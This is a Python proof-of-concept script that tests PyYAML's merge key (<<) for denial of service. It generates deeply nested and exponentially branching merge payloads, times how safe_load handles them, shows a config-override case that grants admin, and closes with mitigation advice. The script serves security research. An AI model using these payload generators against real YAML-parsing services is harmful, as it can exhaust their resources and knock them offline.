#!/usr/bin/env python3
"""
VULN-008: Merge Key Deep Recursion Attack
Severity: HIGH
Type: Denial of Service (Stack Overflow)

This vulnerability allows attackers to cause stack overflow through
the YAML merge key (<<) feature, which recursively flattens mappings.
"""

import sys
import os
import time

# Add the lib directory to the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'lib'))

import yaml


def test_merge_basic():
    """
    Demonstrate how YAML merge keys work.
    """

    print("=" * 60)
    print("YAML Merge Key (<<) Demonstration")
    print("=" * 60)
    print()

    payload = """
base: &base
  name: "default"
  value: 100

extended:
  <<: *base
  value: 200
  extra: "new field"
"""

    print("Basic merge key usage:")
    print(payload)

    result = yaml.safe_load(payload)
    print("Result:")
    print(f"  base: {result['base']}")
    print(f"  extended: {result['extended']}")
    print()


def test_nested_merge_recursion():
    """
    Test recursion through nested merge keys.
    """

    print("-" * 60)
    print("Nested Merge Key Recursion")
    print("-" * 60)
    print()

    # Create deeply nested merge structures
    for depth in [10, 50, 100, 200, 500, 1000]:
        lines = []
        # First anchor
        lines.append("m0: &m0")
        lines.append("  key: value")

        # Chain of merges
        for i in range(1, depth + 1):
            lines.append(f"m{i}: &m{i}")
            lines.append(f"  <<: *m{i-1}")
            lines.append(f"  k{i}: v{i}")

        # Final reference
        lines.append(f"final: *m{depth}")

        payload = "\n".join(lines)

        print(f"Merge chain depth {depth}:")
        print(f"  Payload size: {len(payload)} bytes")

        start = time.time()
        try:
            result = yaml.safe_load(payload)
            elapsed = time.time() - start

            final = result.get('final', {})
            num_keys = len(final)
            print(f"  [*] SUCCESS - {num_keys} keys in final mapping")
            print(f"  Time: {elapsed:.4f}s")

        except RecursionError as e:
            elapsed = time.time() - start
            print(f"  [!] RecursionError after {elapsed:.4f}s")

        except Exception as e:
            elapsed = time.time() - start
            print(f"  [x] {type(e).__name__}: {str(e)[:50]}")

        print()


def test_merge_sequence_explosion():
    """
    Test merge with sequence of mappings (exponential expansion).
    """

    print("-" * 60)
    print("Merge Sequence Explosion")
    print("-" * 60)
    print()

    # Each merge level references multiple previous mappings
    # This creates exponential growth in the number of merge operations

    for width in [2, 3, 4, 5]:
        for depth in [5, 10, 15, 20]:
            lines = []

            # Create initial mappings
            for w in range(width):
                lines.append(f"m0_{w}: &m0_{w}")
                lines.append(f"  key{w}: value{w}")

            # Chain with multiple merges at each level
            for d in range(1, depth + 1):
                for w in range(width):
                    lines.append(f"m{d}_{w}: &m{d}_{w}")
                    merge_refs = ", ".join([f"*m{d-1}_{i}" for i in range(width)])
                    lines.append(f"  <<: [{merge_refs}]")
                    lines.append(f"  k{d}_{w}: v{d}_{w}")

            # Final reference
            lines.append(f"final: *m{depth}_0")
            payload = "\n".join(lines)

            print(f"Width={width}, Depth={depth}:")
            print(f"  Payload size: {len(payload)} bytes")
            print(f"  Expected merge ops: ~{width}^{depth} = {width**depth:,}")

            start = time.time()
            try:
                result = yaml.safe_load(payload)
                elapsed = time.time() - start

                final = result.get('final', {})
                print(f"  [*] SUCCESS - {len(final)} keys")
                print(f"  Time: {elapsed:.4f}s")

            except RecursionError:
                elapsed = time.time() - start
                print(f"  [!] RecursionError after {elapsed:.4f}s")

            except MemoryError:
                elapsed = time.time() - start
                print(f"  [!] MemoryError after {elapsed:.4f}s")

            except Exception as e:
                elapsed = time.time() - start
                print(f"  [x] {type(e).__name__} after {elapsed:.4f}s")

            print()


def test_circular_merge_detection():
    """
    Test if PyYAML detects circular merge references.
    """

    print("-" * 60)
    print("Circular Merge Reference Detection")
    print("-" * 60)
    print()

    # Note: True circular references in anchors are prevented at the
    # composer level, but let's verify merge behavior

    payload = """
a: &a
  <<: *b
  key_a: val_a

b: &b
  key_b: val_b
"""

    print("Forward reference in merge:")
    print(payload)

    try:
        result = yaml.safe_load(payload)
        print(f"Result: {result}")
    except Exception as e:
        print(f"[x] {type(e).__name__}: {e}")

    print()


def test_merge_with_large_mappings():
    """
    Test merge key with very large mappings.
    """

    print("-" * 60)
    print("Merge with Large Mappings")
    print("-" * 60)
    print()

    for num_keys in [100, 500, 1000, 5000]:
        lines = ["base: &base"]
        for i in range(num_keys):
            lines.append(f"  key{i}: value{i}")

        # Create multiple mappings that merge the base
        for j in range(10):
            lines.append(f"ext{j}:")
            lines.append(f"  <<: *base")
            lines.append(f"  extra{j}: extra_value{j}")

        payload = "\n".join(lines)

        print(f"Base mapping with {num_keys} keys, 10 extensions:")
        print(f"  Payload size: {len(payload):,} bytes")

        start = time.time()
        try:
            result = yaml.safe_load(payload)
            elapsed = time.time() - start

            print(f"  [*] SUCCESS")
            print(f"  Time: {elapsed:.4f}s")

        except Exception as e:
            elapsed = time.time() - start
            print(f"  [x] {type(e).__name__} after {elapsed:.4f}s")

        print()


def test_merge_key_override():
    """
    Test merge key security implications.
    """

    print("-" * 60)
    print("Merge Key Override Security Test")
    print("-" * 60)
    print()

    # Test if merge can be used to override security-sensitive keys
    payload = """
secure_config: &secure
  admin: false
  permissions: read-only
  api_key: ""

user_config:
  <<: *secure
  admin: true
  permissions: admin
  api_key: "stolen_key"
"""

    print("Merge key override attack:")
    print(payload)

    result = yaml.safe_load(payload)
    print("Result:")
    print(f"  secure_config: {result['secure_config']}")
    print(f"  user_config: {result['user_config']}")
    print()
    print("Note: Merge allows later keys to override merged values,")
    print("which could be exploited in configuration injection attacks.")
    print()


if __name__ == '__main__':
    print("PyYAML Merge Key Recursion Attack Test Suite")
    print("=" * 60)
    print()
    print("This test suite demonstrates denial-of-service attacks")
    print("through YAML's merge key (<<) feature.")
    print()

    test_merge_basic()
    test_nested_merge_recursion()
    test_merge_sequence_explosion()
    test_circular_merge_detection()
    test_merge_with_large_mappings()
    test_merge_key_override()

    print("=" * 60)
    print("CONCLUSION")
    print("=" * 60)
    print()
    print("PyYAML's merge key implementation is vulnerable to:")
    print()
    print("1. Deep recursion attacks through nested merge chains")
    print("2. Exponential explosion with merge sequences")
    print("3. Memory exhaustion with large merged mappings")
    print()
    print("RECOMMENDATIONS:")
    print("  - Add depth limit to flatten_mapping()")
    print("  - Limit the number of merge operations per document")
    print("  - Consider disabling merge key for SafeLoader")
    print("=" * 60)
